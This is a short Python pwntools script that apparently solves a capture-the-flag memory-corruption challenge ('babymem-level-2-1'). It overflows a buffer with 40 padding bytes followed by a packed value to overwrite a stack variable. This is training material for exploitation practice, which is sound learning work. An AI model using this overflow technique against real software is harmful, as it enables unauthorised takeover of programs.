import pwn

p = pwn.process("/challenge/babymem-level-2-1")

p.writeline("44")
val = pwn.p32(0x738e7d68)
p.write(b"A"*40+val)
print(p.readall().decode("utf-8"))
